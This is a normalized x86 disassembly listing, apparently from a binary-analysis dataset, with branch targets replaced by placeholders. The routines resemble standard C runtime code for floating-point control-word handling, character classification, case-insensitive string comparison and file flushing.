mov edi 0x200
test cl 0x8
je r-xdata
mov eax 0x80
test cl 0x4
je r-xdata
or eax edi
test cl 0x2
je r-xdata
or eax 0x400
test cl 0x1
je r-xdata
or eax 0x800
mov esi 0x100
test ecx 0x80000
je r-xdata
or eax 0x1000
mov edx ecx
mov ebx 0x300
and edx ebx
je r-xdata
or eax esi
mov edx 0x3000000
pop edi
and ecx edx
pop esi
pop ebx
cmp ecx 0x1000000
je r-xdata
cmp edx esi
je r-xdata
or eax 0x8040
cmp ecx 0x2000000
je r-xdata
or eax 0x2000
cmp edx edi
je r-xdata
or eax 0x40
pop ebp
retn
cmp ecx edx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp edx ebx
jne r-xdata
pop ebp
retn
or eax 0x8000
pop ebp
retn
or eax 0x6000
jmp r-xdata
sub_43cae5
call sub_444dd8
mov ecx eax
xor eax eax
test cl 0x3f
je r-xdata
retn
test cl 0x1
je r-xdata
test cl 0x4
je r-xdata
push 0x10
pop eax
test cl 0x8
je r-xdata
or eax 0x8
test cl 0x10
je r-xdata
or eax 0x4
test cl 0x20
je r-xdata
or eax 0x2
test cl 0x2
je r-xdata
or eax 0x1
or eax 0x80000
sub_43cb26
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
test cl 0x1
je r-xdata
test cl 0x4
je r-xdata
push 0x10
pop eax
test cl 0x8
je r-xdata
or eax 0x8
test cl 0x10
je r-xdata
or eax 0x4
test cl 0x20
je r-xdata
or eax 0x2
test cl 0x2
je r-xdata
or eax 0x1
push ebx
push esi
movzx esi cx
mov ebx 0x300
mov edx esi
push edi
mov edi 0x200
and edx 0xc00
je r-xdata
or eax 0x80000
and esi ebx
je r-xdata
cmp edx 0x400
je r-xdata
or eax 0x20000
cmp esi edi
jne r-xdata
or eax 0x100
cmp edx 0x800
je r-xdata
pop ebp
retn
or eax 0x40000
pop edi
pop esi
pop ebx
test ecx 0x1000
je r-xdata
or eax 0x10000
jmp r-xdata
or eax edi
jmp r-xdata
cmp edx 0xc00
jne r-xdata
or eax ebx
jmp r-xdata
sub_43cbc7
mov edi edi
push ebp
mov ebp esp
mov cx [ ebp + 0x8 ]
xor eax eax
test cl 0x3f
je r-xdata
pop ebp
retn
test cl 0x1
je r-xdata
test cl 0x4
je r-xdata
push 0x10
pop eax
test cl 0x8
je r-xdata
or eax 0x8
test cl 0x10
je r-xdata
or eax 0x4
test cl 0x20
je r-xdata
or eax 0x2
test cl 0x2
je r-xdata
or eax 0x1
or eax 0x80000
sub_43cc0b
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
fnstsw [ ebp - 0x4 ]
fnclex
cmp [ rw-data ] 0x1
jl r-xdata
mov cx [ ebp - 0x4 ]
xor eax eax
test cl 0x3f
je r-xdata
mov ax [ ebp - 0x4 ]
xor ecx ecx
mov edx ecx
push edi
mov edi 0x80000
test al 0x3f
je r-xdata
mov esp ebp
pop ebp
retn
test cl 0x1
je r-xdata
stmxcsr [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
and eax 0xffffffc0
mov [ ebp - 0xc ] eax
ldmxcsr [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
test al 0x3f
je r-xdata
test al 0x1
je r-xdata
test cl 0x4
je r-xdata
push 0x10
pop eax
or ecx edx
mov eax ecx
pop edi
jmp r-xdata
test al 0x1
je r-xdata
test al 0x4
je r-xdata
push 0x10
pop edx
test cl 0x8
je r-xdata
or eax 0x8
test al 0x4
je r-xdata
push 0x10
pop ecx
test al 0x8
je r-xdata
or edx 0x8
test cl 0x10
je r-xdata
or eax 0x4
test al 0x8
je r-xdata
or ecx 0x8
test al 0x10
je r-xdata
or edx 0x4
test cl 0x20
je r-xdata
or eax 0x2
test al 0x10
je r-xdata
or ecx 0x4
test al 0x20
je r-xdata
or edx 0x2
test cl 0x2
je r-xdata
or eax 0x1
test al 0x20
je r-xdata
or ecx 0x2
test al 0x2
je r-xdata
or edx 0x1
or eax 0x80000
test al 0x2
je r-xdata
or ecx 0x1
or edx edi
or ecx edi
sub_43cce9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
fwait
fnstcw [ ebp - 0x8 ]
mov ax [ ebp - 0x8 ]
xor ecx ecx
test al 0x1
je r-xdata
test al 0x4
je r-xdata
push 0x10
pop ecx
test al 0x8
je r-xdata
or ecx 0x8
test al 0x10
je r-xdata
or ecx 0x4
test al 0x20
je r-xdata
or ecx 0x2
test al 0x2
je r-xdata
or ecx 0x1
push ebx
push esi
movzx esi ax
mov ebx 0xc00
mov edx esi
push edi
mov edi 0x200
and edx ebx
je r-xdata
or ecx 0x80000
and esi 0x300
je r-xdata
cmp edx 0x400
je r-xdata
or ecx 0x20000
cmp esi edi
jne r-xdata
or ecx 0x100
cmp edx 0x800
je r-xdata
mov edi [ ebp + 0xc ]
mov esi edi
mov eax [ ebp + 0x8 ]
not esi
and esi ecx
and eax edi
or esi eax
cmp esi ecx
je r-xdata
or ecx 0x40000
mov edx 0x1000
test dx ax
je r-xdata
or ecx 0x10000
jmp r-xdata
or ecx edi
jmp r-xdata
cmp edx ebx
jne r-xdata
cmp [ rw-data ] 0x1
jl r-xdata
push esi
call sub_43d037
pop ecx
mov [ ebp - 0x4 ] ax
fldcw [ ebp - 0x4 ]
fwait
fnstcw [ ebp - 0x4 ]
mov ax [ ebp - 0x4 ]
xor esi esi
test al 0x1
je r-xdata
or ecx 0x300
jmp r-xdata
mov eax esi
and edi 0x308031f
stmxcsr [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
xor ecx ecx
test al al
jns r-xdata
test al 0x4
je r-xdata
push 0x10
pop esi
test eax 0x200
je r-xdata
push 0x10
pop ecx
test al 0x8
je r-xdata
or esi 0x8
test eax 0x400
je r-xdata
or ecx 0x8
test al 0x10
je r-xdata
or esi 0x4
test eax 0x800
je r-xdata
or ecx 0x4
test al 0x20
je r-xdata
or esi 0x2
test edx eax
je r-xdata
or ecx 0x2
test al 0x2
je r-xdata
or esi 0x1
test eax 0x100
je r-xdata
or ecx 0x1
movzx edx ax
mov ecx edx
and ecx ebx
je r-xdata
or esi 0x80000
mov edx eax
mov ebx 0x6000
and edx ebx
je r-xdata
or ecx 0x80000
and edx 0x300
je r-xdata
cmp ecx 0x400
je r-xdata
push 0x40
and eax 0x8040
pop ebx
sub eax ebx
je r-xdata
cmp edx 0x2000
je r-xdata
or esi 0x20000
cmp edx 0x200
jne r-xdata
or esi 0x100
cmp ecx 0x800
je r-xdata
or ecx 0x2000000
sub eax 0x7fc0
je r-xdata
or ecx 0x100
cmp edx 0x4000
je r-xdata
or esi 0x40000
mov edx 0x1000
test dx ax
je r-xdata
or esi 0x10000
jmp r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebx
jne r-xdata
mov eax ecx
or ecx esi
xor eax esi
test eax 0x8031f
je r-xdata
push eax
call sub_43ca3a
push eax
mov [ ebp - 0xc ] eax
call sub_444df6
pop ecx
pop ecx
stmxcsr [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
xor ecx ecx
test al al
jns r-xdata
or ecx 0x3000000
jmp r-xdata
sub eax ebx
jne r-xdata
or ecx 0x200
jmp r-xdata
cmp edx ebx
jne r-xdata
or esi 0x300
jmp r-xdata
mov eax ecx
jmp r-xdata
or ecx 0x80000000
test eax 0x200
je r-xdata
push 0x10
pop ecx
mov eax edi
and edi [ ebp + 0x8 ]
not eax
and eax ecx
or eax edi
cmp eax ecx
je r-xdata
or ecx 0x1000000
jmp r-xdata
or ecx 0x300
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test eax 0x400
je r-xdata
or ecx 0x8
test eax 0x800
je r-xdata
or ecx 0x4
test eax 0x1000
je r-xdata
or ecx 0x2
test eax 0x100
je r-xdata
or ecx 0x1
mov edx eax
mov edi 0x6000
and edx edi
je r-xdata
or ecx 0x80000
and eax 0x8040
sub eax ebx
je r-xdata
cmp edx 0x2000
je r-xdata
or ecx 0x2000000
sub eax 0x7fc0
je r-xdata
or ecx 0x100
cmp edx 0x4000
je r-xdata
or ecx 0x3000000
jmp r-xdata
sub eax ebx
jne r-xdata
or ecx 0x200
jmp r-xdata
cmp edx edi
jne r-xdata
or ecx 0x1000000
jmp r-xdata
or ecx 0x300
jmp r-xdata
sub_43d007
push esi
call sub_43c07b
mov esi [ eax ]
fninit
call sub_40cfc4
call sub_43ca2e
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi + 0x4 ]
test [ eax ] 0x10008
je r-xdata
and [ eax + 0x20 ] 0x0
mov [ eax + 0x24 ] 0xffff
sub_43d037
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
test cl 0x10
je r-xdata
test cl 0x8
je r-xdata
inc eax
test cl 0x4
je r-xdata
or eax 0x4
test cl 0x2
je r-xdata
or eax 0x8
test cl 0x1
je r-xdata
or eax 0x10
test ecx 0x80000
je r-xdata
or eax 0x20
push esi
mov edx ecx
mov esi 0x300
push edi
mov edi 0x200
and edx esi
je r-xdata
or eax 0x2
mov edx ecx
and edx 0x30000
je r-xdata
cmp edx 0x100
je r-xdata
or eax esi
cmp edx 0x10000
jne r-xdata
or eax 0x400
cmp edx edi
je r-xdata
pop ebp
retn
or eax 0x1000
pop edi
pop esi
test ecx 0x40000
je r-xdata
or eax edi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp edx esi
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_43d0d0
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x9001f
mov ecx [ ebp + 0xc ]
jne r-xdata
push esi
and ecx 0xfff7ffff
xor esi esi
push ecx
push [ ebp + 0x8 ]
push esi
call sub_42d191
add esp 0xc
test eax eax
jne r-xdata
cmp ecx 0xffffffff
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_430e5d
int3
pop esi
fwait
fnstcw [ ebp - 0x4 ]
mov ax [ ebp - 0x4 ]
mov edx 0x1f3d
and ax dx
mov edx 0x23d
cmp ax dx
jne r-xdata
cmp [ rw-data ] 0x1
jl r-xdata
mov esp ebp
pop ebp
retn
stmxcsr [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
and eax 0xfec0
cmp eax 0x1e80
je r-xdata
sub_43d148
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
fwait
fnstsw [ ebp - 0x4 ]
mov dx [ ebp - 0x4 ]
xor eax eax
mov ecx eax
mov esi 0x80000
test dl 0x3f
je r-xdata
cmp [ rw-data ] 0x1
jl r-xdata
test dl 0x1
je r-xdata
mov eax ecx
stmxcsr [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
test dl 0x3f
je r-xdata
test dl 0x4
je r-xdata
push 0x10
pop ecx
or eax ecx
jmp r-xdata
test dl 0x1
je r-xdata
test dl 0x8
je r-xdata
or ecx 0x8
pop esi
mov esp ebp
pop ebp
retn
test dl 0x4
je r-xdata
push 0x10
pop eax
test dl 0x10
je r-xdata
or ecx 0x4
test dl 0x8
je r-xdata
or eax 0x8
test dl 0x20
je r-xdata
or ecx 0x2
test dl 0x10
je r-xdata
or eax 0x4
test dl 0x2
je r-xdata
or ecx 0x1
test dl 0x20
je r-xdata
or eax 0x2
or ecx esi
test dl 0x2
je r-xdata
or eax 0x1
or eax esi
sub_43d1e4
mov edi edi
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x8 ]
test edx edx
je r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
fwait
fnstsw [ ebp - 0x4 ]
mov cx [ ebp - 0x4 ]
xor eax eax
test cl 0x3f
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
call sub_43cae5
mov [ esi ] eax
mov [ edx ] eax
test cl 0x1
je r-xdata
test cl 0x4
je r-xdata
push 0x10
pop eax
test cl 0x8
je r-xdata
or eax 0x8
test cl 0x10
je r-xdata
or eax 0x4
test cl 0x20
je r-xdata
or eax 0x2
test cl 0x2
je r-xdata
or eax 0x1
or eax 0x80000
sub_43d25c
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov ax [ ebp + 0x8 ]
mov ecx 0xffff
cmp ax cx
jne r-xdata
mov ecx 0x100
cmp ax cx
jae r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x8 ] ax
xor eax eax
mov [ ebp - 0x4 ] ax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp - 0x8 ]
push eax
push 0x1
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
movzx ecx ax
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
jmp r-xdata
mov esp ebp
pop ebp
retn
movzx eax [ ebp - 0x4 ]
movzx ecx [ ebp + 0xc ]
and eax ecx
sub_43d2bb
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43d2ec
add esp 0xc
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax [ ebp + 0xc ]
pop ebp
retn
sub_43d2ec
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
lea ecx [ ebp - 0x20 ]
call sub_41cbf0
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov eax ebx
lea ecx [ ebp - 0x1c ]
sar eax 0x8
mov [ ebp - 0x24 ] eax
push ecx
movzx eax al
push eax
call sub_43ef62
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] bl
xor ecx ecx
mov [ ebp - 0xf ] al
inc ecx
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x10 ] al
xor eax eax
push 0x2
mov [ ebp - 0xf ] bl
mov [ ebp - 0xe ] al
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0x14 ] 0x0
je r-xdata
movzx eax [ ebp - 0xc ]
cmp [ ebp - 0x14 ] al
je r-xdata
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ax
mov eax [ ebp - 0x1c ]
push 0x1
push [ eax + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
push ecx
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x1c ]
push 0x1
push eax
call sub_43a483
add esp 0x1c
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x20 ]
and [ ecx + 0x350 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
and [ eax + 0x350 ] 0xfffffffd
sub_43d3be
mov edi edi
push ebp
mov ebp esp
push esi
xor ecx ecx
mov esi 0xe3
pop esi
pop ebp
retn
test edx edx
jns r-xdata
lea ecx [ eax + 0x1 ]
lea esi [ eax - 0x1 ]
jmp r-xdata
lea eax [ esi + ecx ]
cdq
sub eax edx
mov edx [ ebp + 0x8 ]
sar eax 0x1
sub edx [ eax * 8 + r--data ]
je r-xdata
or eax 0xffffffff
cmp ecx esi
jle r-xdata
sub_43d3f5
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
xor edi edi
mov ebx 0xe3
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] ebx
mov edx eax
cmp ax bx
ja r-xdata
add esi 0x2
sub [ ebp - 0x4 ] 0x1
je r-xdata
cmp ax bx
ja r-xdata
add eax 0x20
movzx edx ax
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edi [ ebp - 0xc ]
mov ebx [ ebp - 0x8 ]
movzx eax ax
movzx edx dx
sub edx eax
je r-xdata
test dx dx
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ esi ]
cmp ax di
jb r-xdata
mov eax [ ecx * 8 + r--data ]
test edx edx
jns r-xdata
cmp dx ax
je r-xdata
lea edi [ ecx + 0x1 ]
mov [ ebp - 0xc ] edi
lea ebx [ ecx - 0x1 ]
mov [ ebp - 0x8 ] ebx
jmp r-xdata
movzx eax [ ecx + esi ]
cmp ax di
jb r-xdata
lea eax [ ebx + edi ]
mov [ ebp - 0x4 ] 0x55
cdq
sub eax edx
mov ecx eax
sar ecx 0x1
push 0x41
pop edi
mov [ ebp - 0x10 ] ecx
mov esi [ ecx * 8 + r--data ]
mov ecx [ ebp + 0x8 ]
push 0x5a
sub ecx esi
pop ebx
or eax 0xffffffff
jmp r-xdata
cmp edi ebx
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43d4b1
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x10 ]
xor eax eax
test esi esi
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
push ebx
push edi
mov edi [ ebp + 0x8 ]
push 0x41
pop ebx
push 0x5a
pop edx
sub edi ecx
mov [ ebp - 0x4 ] edx
jmp r-xdata
movzx eax [ edi + ecx ]
cmp ax bx
jb r-xdata
mov edx eax
cmp ax dx
ja r-xdata
add ecx 0x2
sub esi 0x1
je r-xdata
cmp ax [ ebp - 0x4 ]
ja r-xdata
add eax 0x20
movzx edx ax
jmp r-xdata
movzx ecx ax
movzx eax dx
pop edi
sub eax ecx
pop ebx
test dx dx
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp ax bx
jb r-xdata
cmp dx ax
je r-xdata
push 0x5a
pop edx
sub_43d526
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
test ecx ecx
je r-xdata
xor eax eax
cmp ecx 0x400
je r-xdata
cmp ecx 0x800
je r-xdata
cmp [ ebp + 0xc ] 0x0
mov esi [ ebp + 0x10 ]
jne r-xdata
test esi esi
js r-xdata
test esi esi
jg r-xdata
xor edi edi
mov ebx 0xe3
test eax eax
js r-xdata
test edx edx
jns r-xdata
mov ebx [ eax * 8 + r--data ]
push 0x55
push ebx
call sub_4349f1
mov edi eax
pop ecx
pop ecx
test esi esi
jle r-xdata
lea edi [ eax + 0x1 ]
lea ebx [ eax - 0x1 ]
jmp r-xdata
lea eax [ edi + 0x1 ]
jmp r-xdata
cmp edi esi
jge r-xdata
lea eax [ ebx + edi ]
cdq
sub eax edx
mov edx ecx
sar eax 0x1
sub edx [ eax * 8 + r--data ]
je r-xdata
or eax 0xffffffff
cmp edi ebx
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push esi
push [ ebp + 0xc ]
call sub_436420
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_430e5d
int3
sub_43d5d0
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call sub_43d3f5
pop ecx
test eax eax
js r-xdata
cmp eax 0xe4
jae r-xdata
mov eax [ eax * 8 + r--data ]
pop ebp
retn
sub_43d5fc
push 0xc
push r--data
call sub_40d270
xor esi esi
mov [ ebp - 0x1c ] esi
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_438cfe
pop ecx
mov [ ebp - 0x4 ] esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov edi [ eax ]
mov edx edi
sar edx 0x6
mov eax edi
and eax 0x3f
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x1
je r-xdata
call sub_430f56
mov [ eax ] 0x9
or esi 0xffffffff
push edi
call sub_438f7b
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43d688
mov eax esi
call sub_40d2b6
retn 0xc
call sub_430f43
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
sub_43d694
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_43d5fc
mov esp ebp
pop ebp
retn
sub_43d6f9
mov eax [ ecx ]
push esi
mov esi [ eax ]
mov eax esi
and eax 0x3f
mov edx esi
sar edx 0x6
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x1
je r-xdata
call sub_430f56
pop esi
mov [ eax ] 0x9
or eax 0xffffffff
retn
push esi
call sub_438f7b
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
je r-xdata
call sub_430f43
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
xor eax eax
pop esi
retn
sub_43d757
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_430f56
mov [ eax ] 0x9
jmp r-xdata
call sub_430f56
mov [ eax ] 0x9
call sub_430e30
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov eax esi
mov edx esi
and eax 0x3f
sar edx 0x6
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x1
je r-xdata
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
push esi
call sub_43d694
pop ecx
pop ecx
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
sub_43d7c6
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
push edi
test eax eax
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43d87e
add esp 0x10
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
pop edi
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
mov eax 0x7fffffff
jmp r-xdata
push ebx
push esi
push 0x41
pop ebx
push 0x5a
pop esi
sub edx ecx
mov [ ebp - 0x4 ] esi
jmp r-xdata
movzx eax [ edx + ecx ]
cmp ax bx
jb r-xdata
mov esi eax
cmp ax si
ja r-xdata
add ecx 0x2
sub edi 0x1
je r-xdata
cmp ax [ ebp - 0x4 ]
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
movzx ecx ax
movzx eax si
pop esi
sub eax ecx
pop ebx
jmp r-xdata
test si si
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp ax bx
jb r-xdata
cmp si ax
je r-xdata
push 0x5a
pop esi
sub_43d87e
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
xor esi esi
push edi
cmp [ ebp + 0x10 ] esi
je r-xdata
mov eax esi
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
mov eax 0x7fffffff
jmp r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x14 ]
call sub_41cbf0
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xa8 ] esi
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ ebx ]
push eax
call sub_444f48
movzx esi ax
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ edi ]
push eax
call sub_444f48
add esp 0x10
movzx eax ax
sub [ ebp + 0x10 ] 0x1
lea ebx [ ebx + 0x2 ]
lea edi [ edi + 0x2 ]
je r-xdata
mov ecx [ ebp + 0x10 ]
sub ebx edi
push 0x41
pop edx
push 0x5a
pop esi
mov [ ebp - 0x4 ] esi
jmp r-xdata
movzx eax ax
movzx esi si
sub esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
test si si
je r-xdata
movzx eax [ ebx + edi ]
cmp ax dx
jb r-xdata
mov ecx [ ebp - 0x14 ]
and [ ecx + 0x350 ] 0xfffffffd
cmp si ax
je r-xdata
mov esi eax
cmp ax si
ja r-xdata
add edi 0x2
sub ecx 0x1
je r-xdata
cmp ax [ ebp - 0x4 ]
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
test si si
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ edi ]
cmp ax dx
jb r-xdata
cmp si ax
je r-xdata
push 0x5a
pop esi
jmp r-xdata
sub_43d980
push ebx
push esi
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x10 ]
mov ebx [ esp + 0x14 ]
test ebx 0xffffffff
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub ecx edx
test edx 0x3
je r-xdata
lea eax [ edx + ecx ]
and eax 0xfff
cmp eax 0xffc
ja r-xdata
movzx eax [ edx + ecx ]
cmp al [ edx ]
jne r-xdata
mov eax [ edx + ecx ]
cmp eax [ edx ]
jne r-xdata
sbb eax eax
or eax 0x1
pop esi
pop ebx
retn
test eax eax
je r-xdata
sub ebx 0x4
jbe r-xdata
inc edx
sub ebx 0x1
jbe r-xdata
lea esi [ eax - 0x1010101 ]
add edx 0x4
not eax
and eax esi
test eax 0x80808080
je r-xdata
test dl 0x3
jne r-xdata
sub_43d9f8
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
push esi
test eax eax
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43da64
add esp 0x10
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
mov eax 0x7fffffff
jmp r-xdata
mov esi 0x7fffffff
cmp [ ebp + 0x10 ] esi
jbe r-xdata
pop esi
pop ebp
retn
pop esi
pop ebp
jmp sub_445030
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
mov eax esi
jmp r-xdata
sub_43da64
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
push ebx
push esi
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_41cbf0
mov edi [ ebp + 0x8 ]
mov esi 0x7fffffff
test edi edi
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
jmp r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx esi
jbe r-xdata
pop edi
mov eax esi
pop esi
pop ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
mov eax [ ebp - 0xc ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
sub edi ebx
push ecx
push ebx
push edi
call sub_445030
add esp 0xc
mov esi eax
jmp r-xdata
sub esi eax
test esi esi
je r-xdata
cmp esi eax
je r-xdata
movzx eax [ edi + ebx ]
lea ecx [ ebp - 0xc ]
push ecx
push eax
call sub_433861
lea ecx [ ebp - 0xc ]
mov esi eax
movzx eax [ ebx ]
push ecx
push eax
call sub_433861
add esp 0x10
inc ebx
sub [ ebp + 0x10 ] 0x1
je r-xdata
sub_43db1c
push 0x14
push r--data
call sub_40d270
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] eax
push eax
push [ ebp + 0x10 ]
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x24 ]
push eax
call sub_43e542
add esp 0x1c
mov esi eax
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43db95
test esi esi
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
mov eax [ ebp - 0x1c ]
call sub_430f56
mov [ eax ] esi
jmp r-xdata
call sub_40d2b6
retn
or eax 0xffffffff
jmp r-xdata
sub_43db95
cmp [ ebp - 0x24 ] 0x0
je r-xdata
retn
test esi esi
je r-xdata
push [ ebp - 0x1c ]
call sub_438db5
pop ecx
mov eax [ ebp - 0x1c ]
mov edx eax
sar edx 0x6
and eax 0x3f
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
and [ eax + ecx + 0x28 ] 0xfe
sub_43dbcc
push 0x14
push r--data
call sub_40d270
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] eax
push eax
push [ ebp + 0x10 ]
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x24 ]
push eax
call sub_43e60b
add esp 0x1c
mov esi eax
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43dc45
